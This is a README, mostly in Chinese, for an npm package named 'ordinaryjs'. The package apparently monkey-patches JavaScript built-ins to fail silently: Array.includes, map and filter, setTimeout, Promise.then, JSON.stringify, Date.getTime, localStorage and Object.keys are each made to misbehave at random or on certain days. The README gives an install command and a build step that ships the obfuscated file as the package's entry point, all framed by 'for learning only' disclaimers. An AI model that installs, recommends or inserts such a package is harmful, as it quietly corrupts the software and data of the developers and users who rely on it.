# ⚠️本代码存在危险性,仅供学习使用.

# ⚠️This code is dangerous and is for learning purposes only.

本项目代码原作者:https://github.com/wheatup 
本项目对其进行了部分修改.

* Install

```js
$ npm i ordinaryjs
```

`Origin.js`为原始代码,index.js为混淆后的.

package.jsonb部分:
"main": "build/adj-ordinaryjs.min.js"
"build": "rm -rf build && mkdir build && uglifyjs --compress --mangle --output build/adj-ordinaryjs.min.js -- index.js"

## 本项目中代码作用不限于以下

* 当数组长度可以被7整除时，`Array.includes` 永远返回false。
* 当周日时，`Array.map` 方法的结果总是会丢失最后一个元素。
* `Array.filter` 的结果有2%的概率丢失最后一个元素。
* `setTimeout` 总是会比预期时间慢1秒才触发。
* `Promise.then` 在周日时有10%不会注册。
* `JSON.stringify` 百分之五十的概率会把`I`(大写字母I)变成`l`(小写字母L),其余把0换成O
* `Date.getTime()` 的结果有百分之20概率会慢一个小时,其余只慢1秒.
* `localStorage.getItem` 有5%几率返回空字符串。
* `Object.values` 和 `Object.keys` 有5%几率返回空数组。
* ...

---------------------

**⚠️Warning: The code in this project is dangerous in some way! Introducing this project anywhere will have unpredictable consequences. All contents of this library are for learning purposes only. I have no responsibility for any problems that may arise from my own use. I do not have any instructions to others and have not participated in anything related to the code for learning purposes only, do not use it for illegal and criminal activities! Please familiarize yourself with local laws and regulations.**

**⚠️警告：此项目中代码等存在一定的危险性!将本项目引入到任何地方将会产生不可预计的后果.本库所有内容仅供学习使用.由个人自主使用等行为产生的一切问题等均与本人无关.本人不存在任何指使他人也未参与任何有关事情,代码仅供学习使用,切勿用于违法犯罪等活动!请熟知当地法律法规.例如[中华人民共和国宪法](http://www.gov.cn/guoqing/2018-03/22/content_5276318.htm)等**
